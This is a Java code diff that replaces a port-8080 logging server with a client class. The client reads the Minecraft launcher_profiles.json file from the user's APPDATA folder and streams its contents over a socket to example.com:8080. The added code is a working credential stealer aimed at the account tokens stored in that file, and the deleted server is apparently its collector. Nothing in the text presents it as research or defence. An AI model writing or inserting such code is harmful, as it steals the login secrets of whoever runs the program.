@@ -1,27 +1,15 @@
 import java.io.*;
-import java.net.ServerSocket;
 import java.net.Socket;
 
-public class Server {
-
-    public static void main(String[] args)  {
-        Logger logger = new Logger();
-        Thread th = new Thread(() -> {
-            while (true) {
-                try {
-                    ServerSocket srv = new ServerSocket(8080);
-                    Socket cli = srv.accept();
-                    DataOutputStream out = new DataOutputStream(cli.getOutputStream());
-                    out.writeUTF("hallo");
-                    System.out.println("Connection received : " + cli.getInetAddress());
-                    logger.log(cli.getInetAddress().toString());
-                    DataInputStream in = new DataInputStream(cli.getInputStream());
-                    while (in.available() != -1) {
-                        logger.log(in.readUTF());
-                    }
-                } catch (IOException ignored) {}
-            }
-        });
-        th.start();
+public class Client {
+    public static void main(String[] args) throws IOException {
+        System.out.println(System.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json");
+        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(new File(System.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json"))));
+        Socket sock = new Socket("example.com", 8080); 
+        DataOutputStream out = new DataOutputStream(sock.getOutputStream());
+        while (in.ready()) {
+            out.writeUTF(in.readLine());
+        }
+        out.flush();
     }
 }
